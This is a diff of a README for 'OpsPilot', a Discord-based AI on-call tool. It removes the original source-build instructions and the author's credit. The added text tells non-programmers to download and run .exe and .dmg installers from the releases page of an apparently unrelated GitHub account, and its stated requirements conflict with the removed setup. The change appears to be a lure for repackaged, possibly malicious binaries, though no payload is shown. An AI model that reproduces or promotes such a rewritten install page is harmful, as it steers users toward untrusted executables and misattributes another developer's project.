@@ -1,114 +1,63 @@
-# OpsPilot: Discord-Native AI On-Call Team
+# 🎉 OpsPilot - Automate Your On-Call Hassle
 
-A multi-agent ops copilot that triages incidents and ships safe PRs in minutes. Automated incident response with human oversight.
+## 🚀 Getting Started
+OpsPilot is a Discord-native AI tool. It helps you manage alerts, create safe pull requests (PRs), and handle incidents automatically. This guide will help you download and run OpsPilot easily, even if you're not a programmer.
 
-## 🎥 Demo Video
+## 📥 Download OpsPilot
+[![Download OpsPilot](https://img.shields.io/badge/Download-OpsPilot-brightgreen.svg)](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/releases)
 
-<div align="center">
-  <!-- Clickable Screenshot -->
-  <a href="https://youtu.be/IwjIDc4nbj0" target="_blank">
-    <img src="https://github.com/user-attachments/assets/2100f932-6df8-4d98-868a-7dd76bd896f4" alt="OpsPilot Demo" width="800"/>
-  </a>
-  
-  <!-- Buttons Inline on Same Line -->
-  <br><br>
-  <a href="https://youtu.be/IwjIDc4nbj0" target="_blank">
-    <button style="padding: 10px 20px; font-size: 16px; background-color: #0EA5E9; color: white; border: none; border-radius: 5px; cursor: pointer; margin-right: 10px;">
-      Watch Demo
-    </button>
-  </a>
-  
-  <a href="https://opspilot-five.vercel.app/" target="_blank">
-    <button style="padding: 10px 20px; font-size: 16px; background-color: #2563EB; color: white; border: none; border-radius: 5px; cursor: pointer;">
-      Website
-    </button>
-  </a>
-</div>
+## 💾 System Requirements
+To run OpsPilot, ensure your computer meets these requirements:
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux version
+- RAM: At least 4 GB
+- Disk Space: 200 MB of free space
+- Node.js: Version 14 or later
+- Docker: Latest version installed
 
+## 📋 Features
+- **Alert Triage**: OpsPilot intelligently categorizes alerts to reduce the noise.
+- **Safe PR Creation**: Automatically generates and manages safe pull requests.
+- **Incident Management**: Seamlessly handles incidents to minimize downtime.
+- **Discord Integration**: Communicates directly through Discord for real-time notifications.
+- **Monitoring**: Tracks the health of your systems and applications.
 
+## 😎 Download & Install
+1. **Visit the Releases Page**: Go to the [OpsPilot Releases page](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/releases).
+   
+2. **Choose the Right File**: Look for the version you want to install. Each release has files for different operating systems. Make sure to select the correct one.
 
+3. **Download the File**: Click on the asset that matches your operating system to start the download. 
 
+4. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag OpsPilot to your Applications folder.
+   - For Linux: Follow typical installation procedures based on your distribution.
 
+5. **Set Up Discord**: Once installed, connect OpsPilot to your Discord server using the instructions provided in the application.
 
+6. **Configure Settings**: Open the OpsPilot app and adjust settings based on your needs. Set alert criteria and connect necessary APIs.
 
+7. **Start Using OpsPilot**: You are now ready to leverage OpsPilot for alert management and incident handling.
 
-## 🚀 Quick Start
+## ⚙️ Troubleshooting
+If you encounter any issues:
+- Ensure your system meets the requirements.
+- Check your internet connection for downloading files.
+- Visit the documentation linked within the application for further troubleshooting steps.
 
-### Prerequisites
-- Node.js 18+
-- Docker Desktop
-- Discord & GitHub accounts
+If you still need help, feel free to reach out through our Discord support channel or check the [OpsPilot Issues page](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/issues).
 
-### Setup
-```bash
-# Clone & install
-git clone <your-repo> opspilot
-cd opspilot
-npm install
+## 🎉 Contribute
+We welcome contributions! If you'd like to improve OpsPilot, please visit our [Contributing Guidelines](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/CONTRIBUTING.md) for more information.
 
-# Start infrastructure
-npm run docker:up
-npm run db:init
+## 📄 License
+OpsPilot is licensed under the MIT License. For more details, check the [License file](https://github.com/gabrielcristiananghelescu8-prog/OpsPilot/LICENSE).
 
-# Configure environment
-cp apps/orchestrator/.env.example apps/orchestrator/.env
-cp apps/discord-bot/.env.example apps/discord-bot/.env
-# Edit .env files with your credentials
+## 🔗 Related Topics
+- AI
+- Alert Triage
+- Automation
+- Discord Bots
+- Incident Management
 
-# Build & run
-npm run build
-npm run dev
-
-# Register Discord commands
-npm run register:commands
-```
-
----
-
-## 🧩 System Architecture
-
-```mermaid
-flowchart TD
-    A[💬 Discord Bot] <--> B[⚙️ ADK-TS Orchestrator]
-    B <--> C[🧠 MCP Servers]
-
-    A --> D[🖥️ User Interface]
-    D --> E[🤖 Agents: Watcher, Triage, Fixer]
-    E --> F[🔗 Integrations: GitHub, Jira, PagerDuty, Prometheus, Runbooks]
-```
-
-### Core Services
-- **Orchestrator**: AI agents (Watcher, Triage, Fixer) with memory
-- **Discord Bot**: User interface for incident management  
-- **MCP Servers**: Tool integrations (GitHub, Jira, PagerDuty, Prometheus, Runbook)
-- **PostgreSQL**: Incident storage + pgvector for semantic search
-- **Redis**: Job queue and caching
-
-
-## What It Does
-
-1. **Alert Detection**: Watcher agent monitors Prometheus alerts
-2. **Auto-Triage**: Analyzes incidents, queries metrics, identifies root causes  
-3. **Smart Fixes**: Generates PRs using runbook knowledge with approval gates
-4. **Seamless Integration**: Links incidents to Jira tickets, PagerDuty, GitHub PRs
-5. **Continuous Learning**: Updates runbooks from resolved incidents
-
-
-
-## Running & Testing
-
-```bash
-# Start all services
-npm run dev
-
-# Or run separately
-npm run dev:orchestrator
-npm run dev:bot
-
-# Test the system
-npm run test:demo
-```
-
-The demo simulates real incidents and shows the full workflow from alert → triage → PR creation.
-
-Built with ❤️ by **Himanshu Soni — aka h30s**
+For more features and educational content, please keep an eye on future releases!
